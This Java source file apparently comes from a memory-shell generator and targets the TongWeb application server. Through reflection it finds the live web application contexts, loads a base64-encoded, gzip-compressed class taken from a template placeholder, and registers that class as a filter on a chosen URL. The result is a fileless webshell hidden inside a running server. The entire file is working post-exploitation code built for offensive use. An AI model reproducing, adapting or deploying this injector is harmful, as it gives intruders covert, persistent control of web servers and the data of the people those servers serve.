package com.reajason.javaweb.memshell.injector.tongweb;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Collection;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class TongWebFilterInjector {

    private String msg = "";

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public TongWebFilterInjector() {
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts != null) {
            for (Object context : contexts) {
                msg += ("context: [" + getContextRoot(context) + "] ");
                try {
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    /**
     * com.tongweb.web.thor.core.ThorStandardContext
     * /opt/tweb6/lib/twnt.jar
     * com.tongweb.catalina.core.ApplicationContext
     * /opt/tweb7/lib/tongweb.jar
     * com.tongweb.server.core.StandardContext
     * /opt/tweb8/version8.0.6.2/tongweb-web.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                if (thread.getName().contains("ContainerBackgroundProcessor")) {
                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                    Collection<?> values = childrenMap.values();
                    for (Object value : values) {
                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                        contexts.addAll(children.values());
                    }
                } else if (thread.getContextClassLoader() != null
                        && thread.getContextClassLoader().getClass().getSimpleName().equals("TongWebWebappClassLoader")) {
                    contexts.add(getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context"));
                }
            }catch (Exception ignored) {

            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    @SuppressWarnings("all")
    public void inject(Object context, Object filter) throws Exception {
        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
            return;
        }
        String filterClassName = getClassName();
        Object filterDef;
        Object filterMap;
        Constructor<?> constructor;
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        try {
            // tongweb 7
            constructor = contextClassLoader.loadClass("com.tongweb.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
            filterDef = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterDef").newInstance();
            filterMap = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception e2) {
            try {
                // tongweb 6
                constructor = contextClassLoader.loadClass("com.tongweb.web.thor.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
                filterDef = contextClassLoader.loadClass("com.tongweb.web.thor.deploy.FilterDef").newInstance();
                filterMap = contextClassLoader.loadClass("com.tongweb.web.thor.deploy.FilterMap").newInstance();
            } catch (Exception e) {
                // tongweb 8
                constructor = contextClassLoader.loadClass("com.tongweb.server.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
                filterDef = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterDef").newInstance();
                filterMap = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterMap").newInstance();
            }
        }
        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
        invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
        invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
        invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});

        constructor.setAccessible(true);
        Object filterConfig = constructor.newInstance(context, filterDef);
        Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
        filterConfigs.put(filterClassName, filterConfig);
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }


    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
